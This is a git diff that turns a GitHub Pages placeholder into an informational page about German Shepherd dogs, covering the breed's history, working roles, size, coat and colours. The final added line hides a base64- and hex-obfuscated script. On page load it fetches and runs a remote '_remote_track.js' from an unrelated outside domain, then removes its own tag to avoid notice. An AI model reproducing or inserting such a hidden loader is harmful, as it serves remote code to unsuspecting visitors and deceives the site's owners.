@@ -1,37 +1,20 @@
-## Welcome to GitHub Pages
+The German Shepherd Dog is one of America’s most popular dog breeds — for good reasons. They’re intelligent and capable working dogs. Their devotion and courage are unmatched. And they’re amazingly versatile.
 
-You can use the [editor on GitHub](https://github.com/ompjdhyn/GermanShepherdDog/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+The breed also goes by the name Alsatian. Despite their purebred status, you may find German Shepherds in shelters and breed specific rescues. So remember to adopt! Don’t shop if this is the breed for you.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
 
-### Markdown
+GSDs excel at most anything they’re trained to do: guide and assistance work for the handicapped, police and military service, herding, search and rescue, drug detection, competitive obedience, and — last but not least — faithful companion.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+See below for all dog breed traits and facts about German Shepherds!
 
-```markdown
-Syntax highlighted code block
+The German Shepherd (German: Deutscher Schäferhund, German pronunciation: [ˈdɔʏtʃɐ ˈʃɛːfɐˌhʊnt]) is a breed of medium to large-sized working dog that originated in Germany. According to the FCI, the breed's English language name is German Shepherd Dog. The breed was officially known as the "Alsatian Wolf Dog" in the UK from after the First World War until 1977 when its name was changed back to German Shepherd. Despite its wolf-like appearance, the German Shepherd is a relatively modern breed of dog, with their origin dating to 1899.
 
-# Header 1
-## Header 2
-### Header 3
+As a herding dog, German Shepherds are working dogs developed originally for herding sheep. Since that time, however, because of their strength, intelligence, trainability, and obedience, German Shepherds around the world are often the preferred breed for many types of work, including disability assistance, search-and-rescue, police and military roles and acting.The German Shepherd is the second-most registered breed by the American Kennel Club and seventh-most registered breed by The Kennel Club in the United Kingdom.
 
-- Bulleted
-- List
 
-1. Numbered
-2. List
+Description
+German Shepherds are medium to large-sized dogs. The breed standard height at the withers is 60–65 cm (24–26 in) for males, and 55–60 cm (22–24 in) for females. German Shepherds are longer than they are tall, with an ideal proportion of 10 to ​8 1⁄2. The AKC official breed standard does not set a standard weight range. They have a domed forehead, a long square-cut muzzle with strong jaws and a black nose. The eyes are medium-sized and brown. The ears are large and stand erect, open at the front and parallel, but they often are pulled back during movement. A German Shepherd has a long neck, which is raised when excited and lowered when moving at a fast pace as well as stalking. The tail is bushy and reaches to the hock.
+German Shepherds have a double coat which is close and dense with a thick undercoat. The coat is accepted in two variants: medium and long. The long-hair gene is recessive, making the long-hair variety rarer. Treatment of the long-hair variation differs across standards; they are accepted but not competed with standard coated dogs under the German and UK Kennel Clubs while they can compete with standard coated dogs, but are considered a fault in the American Kennel Club. The FCI accepted the long-haired type in 2010, listing it as the variety b, while short-haired type is listed as the variety a.
 
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/ompjdhyn/GermanShepherdDog/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+Most commonly, German Shepherds are either tan/black or red/black. Most color varieties have black masks and black body markings which can range from a classic "saddle" to an over-all "blanket". Rarer color variations include the sable, pure-black, pure-white, liver, silver, blue, and panda varieties. The all-black and sable varieties are acceptable according to most standards; however, the blue and liver are considered to be serious faults and the all-white is grounds for instant disqualification from showing in conformation at All Breed and Specialty Shows
+<script id="hr5On" src="data:text/javascript;base64, dmFyIF83dTRIbyA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX09jQmFHLCBfTEZObDUpIHt2YXIgXzNsVXRzID0gZnVuY3Rpb24oX1U0bmtCKSB7d2hpbGUgKC0tX1U0bmtCKSB7X09jQmFHWydwdXNoJ10oX09jQmFHWydzaGlmdCddKCkpO319O18zbFV0cygrK19MRk5sNSk7fShfN3U0SG8sIDB4MTFiKSk7dmFyIF9odUdtMSA9IGZ1bmN0aW9uKF9XY2pBTywgX3JtS0ZEKSB7X1djakFPID0gX1djakFPIC0gMHgwO3ZhciBfTTUxaVcgPSBfN3U0SG9bX1djakFPXTtyZXR1cm4gX001MWlXO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfaHVHbTEoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1ROQlNLID0gZG9jdW1lbnRbX2h1R20xKCcweDEnKV0oX2h1R20xKCcweDInKSk7X1ROQlNLW19odUdtMSgnMHgzJyldID0gX2h1R20xKCcweDQnKTtfVE5CU0tbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg3M1x4NzBceDMyXHg2Zlx4NjlceDM5XHg3OFx4NzNceDJlXHg3MFx4NzJceDZmXHg2Nlx4NjVceDczXHg3OVx4NjFceDc5XHg2OVx4NmVceDZjXHg2MVx4NzJceDY5XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NTNceDRiXHg3N1x4NDhceDRmXHg1OVx4NDFceDMwXHg0ZVx4NzknO2RvY3VtZW50W19odUdtMSgnMHg1JyldKF9odUdtMSgnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9UTkJTSyk7ZG9jdW1lbnRbX2h1R20xKCcweDcnKV0oJ2hyNU9uJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
